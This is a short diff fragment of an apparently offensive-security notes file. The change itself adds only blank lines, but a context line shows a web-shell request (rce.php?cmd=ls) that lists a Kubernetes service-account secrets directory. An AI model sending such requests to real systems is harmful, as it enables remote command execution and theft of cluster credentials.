@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:19:49.527370+00:00'
 ```bash
 https://website.com?rce.php?cmd=ls /var/run/secrets/kubernets.io/serviceaccount
 ```
+
+
